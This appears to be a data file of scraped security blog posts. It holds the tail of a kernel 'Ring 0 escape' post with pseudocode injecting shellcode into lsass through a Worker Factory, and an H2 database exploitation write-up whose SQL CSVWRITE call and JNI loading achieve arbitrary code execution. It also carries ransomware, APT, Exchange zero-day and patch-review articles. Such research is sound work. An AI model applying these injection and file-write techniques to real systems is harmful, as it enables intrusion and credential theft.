in Microsoft's side that they added ETW tracing for antivirus to it, on more recent versions the tail end of NtQueueApcThreadEx() calls EtwTiLogQueueApcThread() . There have been some documented bypasses . There's also been issues in SMBGhost where CFG didn't like the user mode APC start address , which hugeh0ge found a workaround for. SharedUserData SystemCall Hook (+ Others) APCs are one of several methods described by bugcheck and skape in Uninformed 's Windows Kernel-Mode Payload Fundamentals . Another is called SharedUserData SystemCall Hook . The only exploit prior to EternalBlue in Metasploit that required this type of kernel mode payload was MS09-050 , in x86 shellcode only. Stephen Fewer had a writeup of how the MS09-050 Metasploit shellcode performed this system call hook . Hook syscall MSR. Wait for desired process to make a syscall. Allocate the payload. Overwrite the user-mode return address for the syscall at the desired payload. There's a bit of glue required to fix up the hijacked thread. Worker Factory Internals Why Worker Factories? They're ETW detecting us with APCs, dog; it's time to evolve. I was originally investigating Worker Factories as a potential user mode process migration technique that avoided the CreateRemoteThread() and QueueUserApc() primitives (and many similar well-known methods). I discovered you cannot create a Worker Factory in another process. However, in Windows 10 all processes that load ntdll receive a thread pool , and thus implicitly have a Worker Factory! To speed up loading DLLs or something. I was able to succeed in messing with the properties of this default Worker Factory, but I did not readily see a way to update the start routine for threads in the pool. I also some some pointers in NTDLL thread pool functions which perhaps could be adjusted to get the process migration to pop. More research is needed. I instead decided to try it as a Ring 0 escape, and here we are. NTDLL Thread Pool Implementation Worker Factories are handles that ntdll communicates with when you use the Thread Pool APIs. These essentially just let you have user-mode work queues that you can post tasks to. Most of the logic is inside ntdll, with the function prefixes Tp and Tpp. This is good, because it means the environment can be adjusted without a context switch, and generally adding additional complexity to kernels should be avoided when possible. It is very easy to create a worker factory, and a process can have many of them. The Windows Internals books has a few pages on them (here is from older 5th edition). The entire kernel mode API is implemented with the following syscalls: ZwCreateWorkerFactory() ZwQueryInformationWorkerFactory() ZwSetInformationWorkerFactory() ZwWaitForWorkViaWorkerFactory() ZwWorkerFactoryWorkerReady() ZwReleaseWorkerFactoryWorker() ZwShutdownWorkerFactory() As ntdll does all the heavy lifting, nothing in the kernel interacts with these functions. As such they are not exported, and require Heresy's Gate . ntdll creates a worker factory, adjusts its parameters such as minimum threads, and uses the other syscalls to inform the kernel that tasks are ready to be run. Worker threads will eat the user-mode work queues to exhaustion before returning to the kernel to wait to be explicitly released again. The main takeaway so far is: the kernel creates and manages the threads . ntdll manages the work items in the queue. Creating a Worker Factory The create syscall has the following prototype: NTSTATUS NTAPI ZwCreateWorkerFactory( _Out_ PHANDLE WorkerFactoryHandleReturn, _In_ ACCESS_MASK DesiredAccess, _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE CompletionPortHandle, _In_ HANDLE WorkerProcessHandle, _In_ PVOID StartRoutine, _In_opt_ PVOID StartParameter, _In_opt_ ULONG MaxThreadCount, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit ); The most interesting parameter for us is the StartRoutine/StartParameter. This will be our Ring 3 code we wish to execute, and anything we want to pass it directly. The WorkerProcessHandle parameter accepts the generic ""current process"" handle of -1, so there is no need to create a proper handle for the process if you are already in the same process context. In kernel mode, this means using KeStackAttachProcess(). As I mentioned earlier, you cannot create a Worker Factory for another process . The reverse engineered psuedocode is: ObpReferenceObjectByHandleWithTag( WorkerProcessHandle, ..., PsProcessType, &Process ); if (KeGetCurrentThread()->ApcState.Process != Process) { return STATUS_INVALID_PARAMETER; } The create function also requires an I/O completion port . This can be gained using ZwCreateIoCompletion(), which is a readily exported function by the Executive. You also must specify some access rights for the WorkerFactoryHandle: #define WORKER_FACTORY_RELEASE_WORKER 0x0001 #define WORKER_FACTORY_WAIT 0x0002 #define WORKER_FACTORY_SET_INFORMATION 0x0004 #define WORKER_FACTORY_QUERY_INFORMATION 0x0008 #define WORKER_FACTORY_READY_WORKER 0x0010 #define WORKER_FACTORY_SHUTDOWN 0x0020 #define WORKER_FACTORY_ALL_ACCESS ( \ STANDARD_RIGHTS_REQUIRED | \ WORKER_FACTORY_RELEASE_WORKER | \ WORKER_FACTORY_WAIT | \ WORKER_FACTORY_SET_INFORMATION | \ WORKER_FACTORY_QUERY_INFORMATION | \ WORKER_FACTORY_READY_WORKER | \ WORKER_FACTORY_SHUTDOWN \ ) greetz to Process Hacker for the reversing of these definitions. However, these evaluate to 0xF003F, and the modern Windows 10 ntdll creates with the mask: 0xF00FF. We only really need WORKER_FACTORY_SET_INFORMATION, but passing a totally full mask shouldn't be an issue (even on older versions). Adjusting Worker Factory Minimum Threads By default, it appears just creating a Worker Factory does not immediately gain you any new threads in the target process. However, you can tune the minimum amount of threads with the following function: NTSTATUS WINAPI NtSetInformationWorkerFactory( _In_ HANDLE WorkerFactoryHandle, _In_ ULONG WorkerFactoryInformationClass, _In_ PVOID WorkerFactoryInformation, _In_ ULONG WorkerFactoryInformationLength ); The enumeration of options: typedef enum _WORKERFACTORYINFOCLASS { WorkerFactoryTimeout, // q; s: LARGE_INTEGER WorkerFactoryRetryTimeout, // q; s: LARGE_INTEGER WorkerFactoryIdleTimeout, // q; s: LARGE_INTEGER WorkerFactoryBindingCount, WorkerFactoryThreadMinimum, // q; s: ULONG WorkerFactoryThreadMaximum, // q; s: ULONG WorkerFactoryPaused, // ULONG or BOOLEAN WorkerFactoryBasicInformation, // WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryAdjustThreadGoal, WorkerFactoryCallbackType, WorkerFactoryStackInformation, // 10 WorkerFactoryThreadBasePriority, WorkerFactoryTimeoutWaiters, // since THRESHOLD WorkerFactoryFlags, WorkerFactoryThreadSoftMaximum, WorkerFactoryThreadCpuSets, // since REDSTONE5 MaxWorkerFactoryInfoClass } WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS; Shout out again to Process Hacker for providing us with these definitions. Step Into the Ring 3 The psuedo-code workflow for Work Out is as follows: PsLookupProcessByProcessId(pid, &lsass) KeStackAttachProcess(lsass) start_addr = ZwAllocateVirtualMemory(RWX) _memcpy(start_addr, shellcode) ZwCreateIoCompletion(&hio) __ZwCreateWorkerFactory(&hWork, hio, start_addr) __ZwSetInformationWorkerFactory(hWork, min_threads = 1) KeUnstackDetachProcess(lsass) ObDereferenceObject(lsass) Attach to the process. Allocate the user mode payload. Create an I/O completion handle. Create a worker factory with the the start routine being the payload. Adjust minimum threads to 1. Reference inect.c in the PoC code. Conclusion I have left other ideas in this post for Ring 0 Escapes that may be worth PROOFing out as an open problem to the reader. If you think of other techniques for Heresy's Gate or Ring 0 Escapes, or just want to troll me, be sure to leave a comment!"
eda6e2a6-1210-5f68-9e95-e3f906a47b48,07-October-2022,Anatomy of a Ransomware Attack: 8 Stages of Operation [White Paper],"Average cost of a ransomware attack hit $1.85 million in 2021. 32% of C-level employees depart the organization after a successful attack, research shows. SANS Institute's Jake Williams and BlackBerry's Ryan Chapman explain the stages of a typical attack.","It’s a dark and rainy night. Thunder rumbles. Lightning flashes. An unexpected crime takes place. Intrigue and deception follow, with a mystery to solve. When it comes to fiction, you might enjoy reading a good mystery to figure out “whodunnit.” Not so, when that crime is a ransomware attack with a digital note telling you that threat actors have compromised your organization’s network, encrypted all your files, and are demanding immediate payment to restore your operations. The Cost of Ransomware: More Than Money In 2021, the average cost of a ransomware attack hit $1.85 million – a 41% increase from the previous year . This includes the ransom, downtime, people time, device cost, network cost, lost opportunity, and more. But beyond the financial and reputational cost, there’s another impact few companies talk about: leadership turnover. Recent research reveals that 32% of the time, C-level employees depart the organization after a successful ransomware attack. To add insult to injury, 80% of targeted organizations are hit by a repeat attack. These are the reasons SANS Institute’s Senior Instructor Jake Williams , and BlackBerry Principal Incident Response & Forensics Consultant Ryan Chapman , joined forces in a recent SANS webcast to explain the various stages of a ransomware operation, and steps organizations can take to lessen vulnerability. Their insights are also echoed in the free white paper Anatomy of a Ransomware Operation . “Ransomware is no longer just an executable that drops onto a device and then does bad things on that device,” Chapman says in the webcast. “Rather, it is an overall operation, and it's carried out by humans with their hands on the keyboard.” Threat actors are “doing things human-operated,” Chapman concludes. “You should too. If you don't have enough security-minded folks, then that's where managed detection and response comes in.” Stages of a Ransomware Attack In the webcast, Williams and Chapman list eight distinct stages in a typical ransomware attack: Initial access – how it's usually accomplished, and why detecting attacker backdoors is so difficult Command and control – and the keys to detection Local privilege escalation – and why it’s so easy for threat actors to carry out Lateral movement – and corresponding detection methods Domain privilege escalation – the top four tactics typically favored by attackers Data exfiltration – threat actors exfiltrate data prior to encryption Searching for your backups – and the lengths malicious actors will go to in order to find them Deployment of the ransomware – and the most common tools attackers use View the webcast , or read the free white paper for more details on each attack stage, and to understand opportunities to disrupt a ransomware attack as it occurs in your environment. You can also stay up to date on ransomware attack protection and prevention by visiting blackberry.com/ransomware . BlackBerry Assistance The BlackBerry Incident Response team can work with organizations of any size and across any vertical, to evaluate and enhance their endpoint security posture and proactively maintain the security, integrity, and resilience of their network infrastructure. For emergency assistance, please email us at DLIR@blackberry.com , or use our handraiser form. Related Reading Ransomware Prevention Is Possible [Infographic] What Is DNS Tunneling and How Do I Stop It? Some Kind of Monster: RaaS Hides Itself Using Traits From Other Malware The Cyber Insurance Gap: What Is It, and How Can We Close It?"
4bb864dd-7824-52fb-9400-4eb03d048fa8,09-March-2021,"BlackBerry exposes threat actor group BAHAMUT: Cyberespionage, phishing and other APTs",BlackBerry has published a report on the advanced persistent threat group BAHAMUT. BAHamUT is a group that focuses its attacks on the Middle East and South Asia. The group has been responsible for a variety of targeted attacks and fake news campaigns. BlackBerry says the group is a hack-for-hire group.,"What do cybercrime, fake news, the Middle East/South Asia and a dragon from the Final Fantasy or the Dungeons & Dragons series all have in common? The answer is an advanced persistent threat (APT) group named BAHAMUT . However, instead of being a political slur or an imagined beast you can encounter during your quests, BAHAMUT is a focused, innovative, patient and evasive threat group that concentrates its attacks on the Middle East and South Asia. Recently, BlackBerry published a report called BAHAMUT: Hack-for-Hire Masters of Phishing, Fake News and Fake Apps, which will be referred to as the report. What is BAHAMUT? Described as both sophisticated and staggering regarding the scope of its malicious activities, BAHAMUT is responsible for a variety of extremely targeted attacks and a variety of unsolved cases that have remained open for years. To give a better idea of the wide range of malicious campaigns that BAHAMUT has been responsible for, below are some of the group’s capabilities: Zero-day exploits Extremely elaborate and targeted phishing campaigns Credential harvesting campaigns New Windows malware Anti-forensic tactics Antivirus (AV) evasion BAHAMUT uses above-average security, top-notch evasion tactics and a lack of discernible motive or pattern of its activities, making it a particularly difficult attack group to pin down. This has led researchers to categorize BAHAMUT as a hack-for-hire group. Recently, the group has increasingly targeted mobile devices and applications. Patience is a virtue, and BAHAMUT has taken to this saying. It has been known to wait a year or more before making a malicious move on a target. The distinctive characteristics of BAHAMUT do not stop at this high-level observation. The most distinctive aspect of BAHAMUT is that the group deceives targets with a concerted fake news effort using meticulously crafted and novel websites, applications and personas. One observation was that BAHAMUT hijacked an information security news website domain and pushed out research, geopolitics and industry-related news about other attack groups. This elaborate scheme included fake contributors, use of photos of legitimate journalists and even fake social media accounts to make the news outlet come across as legitimate. The list of sites BAHAMUT has taken over spans a wide range of interests from news, to information security to fitness. However, aside from this observation, others are more targeted and focus on specific topics related to the area of the world that the group operates in. One such example is the focus that the group has on Sikh political groups and hot-button political issues such as the Sikh Referendum of 2020. BAHAMUT’s targeting BAHAMUT focuses on individuals instead of organizations and has a particular concentration on political, economic and social spheres in the Middle East and South Asia. Historical targets of note are below: Individuals in Sikh political groups within India Websites focused on political issues such as the Sikh Referendum of 2020 in India Turkish government officials People connected to politicians in Qatar UAE diplomats Turkish minister of foreign affairs The Turkish delegate to UNESCO Phishing According to the report, BAHAMUT is head and shoulders above other hack-for-hire organizations. This is attributed to the group’s speed, their ability to change or adapt rapidly and the group’s highly compartmentalized and single-use infrastructure. Another reason for its adeptness in phishing is BAHAMUT’s highly tuned credential harvesting system that focuses on very specific targets. This group can also learn from their mistakes quickly, which makes their phishing tactics even more successful. Throw in the group’s in-depth research it does on its targets and you have an APT with one of the most sophisticated phishing abilities in the world. Mobile applications BAHAMUT is also a step beyond competent when it comes to creating malicious mobile applications. It goes the extra mile compared to other APTs and creates well-thought-out and professional-looking websites that have been described in the report as “impressive.” Their websites contain clearly written terms of service and well-defined privacy policies which other APTs wouldn’t bother investing the time or effort into. It is this extra measure of effort that seems to be the underlying trend with BAHAMUT. BAHAMUT is responsible for a campaign called Operation Bull where the group uploaded several mobile applications to the Google Play Store which managed to bypass the app store’s static code safeguards. These applications were still available in the Google Play store as of July 2020: https://play.google[.]com/store/apps/details?id=com.callrecording.recorder https://play.google[.]com/store/apps/details?id=ramadan.com.ramadan https://play.google[.]com/store/apps/details?id=com.realmusic https://play.google[.]com/store/apps/details?id=com.musicupnew https://play.google[.]com/store/apps/details?id=com.hdmediaplayer According to the report, BAHAMUT’s Android Package Kits (APKs) have several modifications, with most having almost no detection in a well-known malware repository. BlackBerry discovered that these APK files were typically made up of legitimate code as well as commonly used Android libraries. This gives their mobile application operations the necessary veneer of legitimacy to fly under the radar. Other findings BAHAMUT employs at least one zero-day developer exhibiting a skill-level above and beyond other APTs The wide range of tactics, tools and targets led BlackBerry to conclude BAHAMUT is well-resourced, well-funded and capable of high-level security research The group is behind some well-researched exploits with different names, such as EHDEVEL, URPAGE, WINDSHIFT and THE WHITE COMPANY A powerful beast made real BAHAMUT may share its name with a mythical fish or dragon, but there is nothing make-believe about this APT. This group focuses its efforts on cyberespionage and phishing, with a focus on mobile applications, and it buttresses its efforts with a very responsive group of operators that have no problem changing their next steps based upon existing data. The group is also renowned for investing a painstaking amount of time and effort into making its operations appear legitimate, above and beyond other attack groups. These differences put BAHAMUT above the rest. Sources BlackBerry Uncovers Massive Hack-For-Hire Group Targeting Governments, Businesses, Human Rights Groups and Influential Individuals . BlackBerry ThreatVector Bog. BAHAMUT: Hack-For-Hire Masters of Phishing, Fake News, and Fake Apps . BlackBerry Report. Greg is a Veteran IT Professional working in the Healthcare field. He enjoys Information Security, creating Information Defensive Strategy, and writing – both as a Cybersecurity Blogger as well as for fun."
7ef74d39-f6ee-5d5b-ac56-8f95c60e187f,01-August-2019,Exploiting H2 Database with native libraries and JNI,H2 allows users to create user defined functions with Java code that can be compiled on the fly. H2 can be exploited by exploiting a vulnerability in the Jackson library. But this requires the use of a Java compiler on the target server. We show a new way of exploiting H2 without the need of a compiler. We use native libraries and the Java Native Interface (JNI) to do so.,"Techniques to gain code execution in an H2 Database Engine are already well known but require H2 being able to compile Java code on the fly. This blog post will show a previously undisclosed way of exploiting H2 without the need of the Java compiler being available, a way that leads us through the native world just to return into the Java world using Java Native Interface (JNI). Introduction Last week, the blog post Jackson gadgets - Anatomy of a vulnerability by Andrea Brancaleoni of Doyensec was published. It describes how a setter-based vulnerability in the Jackson library can be exploited if the libraries of Logback and H2 Database Engine are available. In short, it exploits the feature of H2 to create user defined functions with Java code that get compiled on the fly using the Java compiler. But what if the Java compiler is not available? This was the exact case in a recent engagement where a H2 Dabatase Engine instance version 1.2.141 on a Windows system was exposing its web console. We want to walk you through the journey of finding a new way to execute arbitrary Java code without the need of a Java compiler on the target server by utilizing native libraries (.dll or .so) and the Java Native Interface (JNI). Assessing the Capabilities of H2 Let's assume the CREATE ALIAS … AS … command cannot be used as the Java compiler is not available. A reason for that may be that it's not a Java Development Kit (JDK) but only a Java Runtime Environment (JRE), which does not come with a compiler. Or the PATH environment variable is not properly set up so that the Java compiler javac cannot be found. However, the CREATE ALIAS … FOR … command can be used: When referencing a method, the class must already be compiled and included in the classpath where the database is running. Only static Java methods are supported; both the class and the method must be public. So every public static method can be used. But in the worst case, only h2-1.2.141.jar and JRE are available. And additionally, only supported data types can be used for nested function calls. So, what is left? While browsing the candidates in the Java runtime library rt.jar , the System.load(String) method stood out. It allows the loading of a native library. That would instantly allow code execution via the library's entry point function. But how can the library be loaded to the H2 server? Although Java on Windows supports UNC paths and fetches the file, it refuses to actually load it. And this also won't work on Linux. So how can one write a file to the H2 server? Writing arbitrary Files with H2 A brief look into the H2 functions reference shows that there is a FILE_WRITE function. Unfortunately, FILE_WRITE was introduced in 1.4.190 . So we better only check those functions that are available in 1.2.141 . The CSVWRITE function is the only one with "" write "" in its name. A quick test showed that the CSV column header also gets printed. Looking at the CSV options showed that there is a writeColumnHeader option to disable writing the column header. Unfortunately, the writeColumnHeader option was only added with 1.3/1.4.177 . But while looking at the other supported options fieldSeparator , fieldDelimiter , escape , null , and lineSeparator , there came an idea: what if we blank them all out and use the CSV column header to write our data? And if the H2 database engine allows columns to have arbitrary names with arbitrary length, we ware be able to write arbitrary data. Looking at H2's grammar for columns , the columnName of a column can be a quoted name , which is defined as: "" anything "" Quoted names are case sensitive, and can contain spaces. There is no maximum name length. Two double quotes can be used to create a single double quote inside an identifier. That sounds almost perfect. So let's see if we can actually put anything in it and if CSVWRITE is binary-safe. First, we generate our test data that covers all 8-bit octets: $ python -c 'import sys;[sys.stdout.write(chr(i)) for i in range(0,256)]' > test.bin $ sha1sum test.bin 4916d6bdb7f78e6803698cab32d1586ea457dfc8 test.bin Now we generate a series of CHAR(n) function calls that will generate our binary data in the SQL query: xxd -p -c 256 test.bin | sed -e 's/../),CHAR(0x&/g' -e 's/^),//' -e 's/$/)/' -e 's/CHAR(0x22)/&,&/g' We then use it in the following CSVWRITE call: SELECT CSVWRITE('C:\Windows\Temp\test.bin', CONCAT('SELECT NULL ""', … , '""'), 'ISO-8859-1', '', '', '', '', ''); Finally, we test if the written file has the same checksum: C:\Windows\Temp> certutil -hashfile test.bin SHA1 SHA1 hash of file test.bin: 49 16 d6 bd b7 f7 8e 68 03 69 8c ab 32 d1 58 6e a4 57 df c8 CertUtil: -hashfile command completed successfully. So, the files seem to be identical! Entering the native World Now that we can write a native library to disk using the built-in function CSVWRITE and load it by creating an alias for System.load(String) , we just could use the library's entry point to achieve code execution. But let's take another it step further. Let's see if there is a way to execute arbitrary commands/code from SQL. Not just once the native library gets loaded, but as we like, possibly even with feedback that we can see in the H2 Console. This is where the Java Native Interface (JNI) comes in. It allows the interaction between native code and the Java Virtual Machine (JVM). So in this case it would allow us to interact with JVM where the H2 Database is running. The idea now is to use JNI to inject a custom Java class into the running JVM via ClassLoader.defineClass(byte[], int, int) . That would allow us to create an alias and call it from SQL. Calling into the JVM with JNI First we need to get a handle to the running JVM. This can be done with the JNI_GetCreatedJavaVMs function . Then we attach the current thread to the VM and obtain a JNI interface pointer ( JNIEnv ). With that pointer we can interact with the JVM and call JNI functions such as FindClass , GetStaticMethodID / GetMethodID> and CallStatic <Type> Method / Call <Type> Method . The plan is to get the system class loader via ClassLoader.getSystemClassLoader() and call defineClass on it: This basically mimics the following Java code: The custom Java class JNIScriptEngine has just one single public static method that evaluates the passed script using an available ScriptEngine instance: Finally, putting everything together: That way we can execute arbitrary JavaScript code from SQL."
c2b11657-7b9e-53af-9ff0-322d2334c038,07-October-2022,Microsoft Exchange Server Zero-Day Mitigation Proves Insufficient,"Two unpatched zero-day vulnerabilities are being exploited to compromise Microsoft Exchange servers. The vulnerability allows for remote code execution via PowerShell. Microsoft Exchange Server versions 2013, 2016, and 2019 are all affected by the vulnerabilities.","In early August 2022, Vietnamese cybersecurity research group GTSC discovered two unpatched zero-day vulnerabilities that remotely compromise on-premises Microsoft Exchange servers. Microsoft confirmed these vulnerabilities were being exploited in a limited and targeted manner. The Common Vulnerabilities and Exposures Program (CVE) is now tracking these Microsoft vulnerabilities as CVE-2022-41040 and CVE-2022-41082 . 41040 is a server-side forgery (SSRF) issue that enables an authenticated threat actor to trigger 41082. SSRFs abuse legitimate server functionality to access or modify resources. In this case, once the initial vulnerability is exploited, the second vulnerability allows for remote code execution via PowerShell. The threat actors can then leverage certutil , a legitimate utility used to dump and display certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and to verify certificates, key pairs, and certificate chains. Microsoft Exchange Server® versions 2013, 2016, and 2019 are all affected by these vulnerabilities. Microsoft Exchange Online has detections and mitigations established to block this vulnerability. Impact In attacks endured by multiple Microsoft customers , the attackers used this exploit to deploy backdoor scripts imitating legitimate Exchange files such as RedirSuiteServiceProxy.aspx, which are available on the Exchange server. Once these backdoor scripts are deployed, credential-stealing malware is spread through the compromised servers. As seen across the broader threat landscape, credential-stealing attacks such as this can lay the groundwork for future attacks, including information stealing and introduction of ransomware. Researchers hypothesize that the exploit originates from China, given the use of Antsword, a popular Chinese language-based open-source web shell (SharPyShell), and China Chopper . Microsoft notes that to exploit the vulnerability, authenticated access to the vulnerable Exchange server is necessary. However, with the rise in credential-stealing and social engineering attacks , obtaining authenticated access has become increasingly easy for threat actors. Mitigation Is Insufficient Protection Shortly after these vulnerabilities were detected, Microsoft provided proposed mitigation that involves blocking the known attack patterns by using the URL Rewrite engine to deliver the blocking rule, and a PowerShell script to automate the deployment. However, security researchers quickly determined that the blocking rule can be bypassed easily, given the over-specificity of the rule. If the threat actor tailors its attack to work outside of this precise rule, the compromised system remains still vulnerable. Microsoft also recommends that organizations disable remote PowerShell access for non-admin users. Ideally, this action would reduce the attack surface if a non-admin account were to be compromised. However, this still leaves systems vulnerable to stolen admin credentials. CylanceOPTICS Customers Have an Additional Layer of Protection From BlackBerry While the initial mitigations provided by Microsoft were identified as insufficient, as a general best practice, BlackBerry strongly recommends that customers concerned about these vulnerabilities follow the recommendations provided by the Microsoft Security Response Center . BlackBerry customers who use CylanceOPTICS® , the BlackBerry® EDR ( endpoint detection and response ) solution, have an additional layer of protection from these vulnerabilities. BlackBerry Threat Research has authored a CylanceOPTICS rule available to download in MyAccount , the BlackBerry customer portal, with specific instructions outlined in Knowledge Base article KB102471 . Once enabled, this rule will help to identify and mitigate the techniques utilized in these zero-day vulnerabilities. Related Reading What Is a Zero-Day Vulnerability? Follina Zero-Day Attacks: How to Mitigate Prepare Your Organization for Potential Cyberattacks The 13 Deadly Sins of APT Incident Response — Part 1 13 Deadly Sins When Dealing With APT Incidents — Part 2 Public Hacking Tools: A Day in the Sun"
f09b9169-acb4-5ccc-b2af-d660a17b3543,13-September-2022,The September 2022 Security Update Review,"Adobe and Microsoft have released security updates for September. Adobe released seven patches addressing 63 bugs in Adobe Experience Manager, InDesign, Photoshop, InCopy, and Illustrator. Apple also released updates for iOS, iPadOS, and Safari on Patch Tuesday.","Another Patch Tuesday is upon us, and Adobe and Microsoft have released a bevy of new security updates. Take a break from your regularly scheduled activities and join us as we review the details of their latest security offerings. Adobe Patches for September 2022 For September, Adobe released seven patches addressing 63 in Adobe Experience Manager, Bridge, InDesign, Photoshop, InCopy, Animate, and Illustrator. A total of 42 of these bugs were reported by ZDI Sr Vulnerability Researcher Mat Powell. The update for InDesign is the largest patch this month, with eight Critical-rated and 10 Important-rated vulnerabilities receiving fixes. The most severe of these could lead to code execution if a specially crafted file is opened on an affected system. The patch for Photoshop fixes 10 CVEs, nine of which are rated Critical. Again, an attacker can get code execution if they can convince a user to open a malicious file. The fix for InCopy fixes five similar code execution bugs and two info disclosure bugs. Adobe Animate also receives patches for two Critical-rated code execution bugs. The update for Adobe Bridge corrects 10 Critical-rated code execution bugs and two Important-rated info disclosure bugs. One of the three Illustrator vulnerabilities getting patched could also lead to code execution. As with the bugs previously mentioned, a user would need to open a malicious file with an affected software version. Finally, the patch for Adobe Experience Manager addresses 11 Important-rated bugs, primarily of the cross-site scripting (XSS) variety. None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3. Apple Patches for September 2022 Yesterday, Apple released updates for iOS, iPadOS, macOS, and Safari. They also released updates for watchOS and tvOS but provided no details on any of the fixes included in these patches. Two of the bugs patched by Apple were identified as being under active exploit. The first is a kernel bug (CVE-2022-32917) resulting from improper bounds checking. It affects iOS 15 and iPadOS 15, macOS Big Sur, and macOS Monterey. Interestingly, this CVE is also listed in the advisory for iOS 16, but it is not called out as being under active exploit for that flavor of the OS. The Big Sur version of macOS also includes a fix for an Out-of-Bounds (OOB) Write bug in the kernel (CVE-2022-32894) that’s also listed as under active attack. One final note: Apple states in its iOS 16 advisory that “Additional CVE entries to be added soon.” It is possible other bugs could also impact this version of the OS. Either way, it’s time to update your Apple devices. Microsoft Patches for September 2022 This month, Microsoft released 64 new patches addressing CVEs in Microsoft Windows and Windows Components; Azure and Azure Arc; .NET and Visual Studio and .NET Framework; Microsoft Edge (Chromium-based); Office and Office Components; Windows Defender; and Linux Kernel (really). This is in addition to the 15 CVEs patched in Microsoft Edge (Chromium-based) and one patch for side-channel speculation in Arm processors. That brings the total number of CVEs to 79. Five of these CVEs were submitted through the ZDI program. The volume of fixes released this month is about half of what we saw in August, but it is in line with the volume of patches from previous September releases. For whatever reason, the last quarter of the calendar year tends to have fewer patches released. We’ll see if that trend continues in 2022. Of the 64 new CVEs released today, five are rated Critical, 57 are rated Important, one is rated Moderate, and one is rated Low in severity. One of these new CVEs is listed as publicly known and under active attack at the time of release. Let’s take a closer look at some of the more interesting updates for this month, starting with the CLFS bug under active attack: - CVE-2022-37969 - Windows Common Log File System Driver Elevation of Privilege Vulnerability This bug in the Common Log File System (CLFS) allows an authenticated attacker to execute code with elevated privileges. Bugs of this nature are often wrapped into some form of social engineering attack, such as convincing someone to open a file or click a link. Once they do, additional code executes with elevated privileges to take over a system. Usually, we get little information on how widespread an exploit may be used. However, Microsoft credits four different agencies reporting this bug, so it’s likely beyond just targeted attacks. - CVE-2022-34718 - Windows TCP/IP Remote Code Execution Vulnerability This Critical-rated bug could allow a remote, unauthenticated attacker to execute code with elevated privileges on affected systems without user interaction. That officially puts it into the “wormable” category and earns it a CVSS rating of 9.8. However, only systems with IPv6 enabled and IPSec configured are vulnerable. While good news for some, if you’re using IPv6 (as many are), you’re probably running IPSec as well. Definitely test and deploy this update quickly. - CVE-2022-34724 - Windows DNS Server Denial of Service Vulnerability This bug is only rated Important since there’s no chance of code execution, but you should probably treat it as Critical due to its potential impact. A remote, unauthenticated attacker could create a denial-of-service (DoS) condition on your DNS server. It’s not clear if the DoS just kills the DNS service or the whole system. Shutting down DNS is always bad, but with so many resources in the cloud, a loss of DNS pointing the way to those resources could be catastrophic for many enterprises. - CVE-2022-3075 - Chromium: CVE-2022-3075 Insufficient data validation in Mojo This patch was released by the Google Chrome team back on September 2, so this is more of an “in case you missed it.” This vulnerability allows code execution on affected Chromium-based browsers (like Edge) and has been detected in the wild. This is the sixth Chrome exploit detected in the wild this year. The trend shows the near-ubiquitous browser platform has become a popular target for attackers. Make sure to update all of your systems based on Chromium. Here’s the full list of CVEs released by Microsoft for September 2022: * Indicates this CVE had previously been assigned by a 3rd-party and is now being incorporated into Microsoft products. Checking the remaining Critical-rated updates, there are two for Windows Internet Key Exchange (IKE) Protocol Extensions that could also be classified as “wormable.” For both bugs, only systems running IPSec are affected. There are also two Critical-rated vulnerabilities in Dynamics 365 (On-Premises) that could allow an authenticated user to perform SQL injection attacks and execute commands as db_owner within their Dynamics 356 database. Moving on to other code execution bugs, more than half of this month’s release involves some form of remote code execution. Of these, the patches for SharePoint stand out. Microsoft recently detailed how a SharePoint bug was used by Iranian threat actors against the Albanian government, resulting in Albania breaking off diplomatic relations with Iran. Those attacks involved a SharePoint bug we had previously blogged about . These new SharePoint cases do require authentication, but they sound very similar to other SharePoint bugs that came through the ZDI program. There are six RCE bugs in OLE DB Provider for SQL Server, but they require user interaction. A threat actor would need a user on an affected system to connect to a malicious SQL server via OLEDB, which could result in the target server receiving a malicious packet, resulting in code execution. There are five RCE bugs in the ODBC driver that also require user interaction. For these, opening a malicious MDB in Access would get code execution, similar to the other open-and-own bugs in Office components. The bug in LDAP also requires user interaction, but no other information about the exploit scenario is given. The bug in the Enterprise App Management component requires authentication, but it’s still intriguing. An attacker could use the vulnerability to install arbitrary SYSTEM services that would then run with SYSTEM privileges. I could definitely see this bug being used after an initial breach for lateral movement and to maintain a presence on a target network. The RPC bug also looks interesting, but it’s likely not as practical since an attacker would need to spoof the localhost IP address of the target. There’s an RCE bug in .NET, but no information besides the requirement for user interaction is given. Finally, there are updates for the AV1 video extension and the Raw image extension. Both updates are delivered automatically through the Microsoft store. If you’re in a disconnected environment, you’ll need to apply these updates manually. There are a total of 19 elevation of privilege (EoP) fixes in this month’s release, including the aforementioned patch for CLFS. Many of these require an authenticated user to run specially crafted code on an affected system. The bug in Windows Defender for Mac fits this description, as do the kernel-related patches. However, there are a couple of interesting bugs that don’t fit this profile. The first of these is a bug in the Credential Roaming Service that could allow attackers to gain remote interactive logon rights on a machine. There are two bugs in Kerberos that could lead to SYSTEM, but both have many caveats, so exploitation is unlikely. The EoP in Azure Guest Configuration and Arc-Enabled servers is fascinating for multiple reasons. A threat actor could use this vulnerability to replace Microsoft-shipped code with their own code, which would then be run as root in the context of a Guest Configuration daemon. On an Azure Arc-enabled server, it could run in the context of the GC Arc Service or Extension Service daemons. While this is interesting on its own, the mere fact that Microsoft is producing patches for the Linux kernel boggles the mind. And, of course, it wouldn’t be a monthly update if it didn’t include a patch for the print spooler. The September release includes six patches for information disclosure vulnerabilities. For the most part, these only result in leaks consisting of unspecified memory contents. One exception is the bug impacting the Data Protection Application Programming Interface (DPAPI). If you aren’t familiar with it, DPAPI allows you to encrypt data using information from the current user account or computer. The bug patched this month could allow an attacker to view the DPAPI master key. The vulnerability in the Windows graphics component could leak metafile memory values, although it’s not clear what an attacker could do with this information. Seven different DoS vulnerabilities are patched this month, including the DNS bug previously mentioned above. Two bugs in secure channel would allow an attacker to crash a TLS by sending specially crafted packets. There’s a DoS in IKE, but unlike the code execution bugs listed above, no IPSec requirements are listed here. If you’re running newer OSes with the latest features, don’t miss the fix for an HTTP DoS. The system needs HTTP/3 enabled and the server using buffered I/O to be affected. HTTP/3 is a new feature in Windows Server 2022, so in this rare instance, older is better. The September release includes a fix for a lone security feature bypass in Network Device Enrollment (NDES) Service. An attacker could 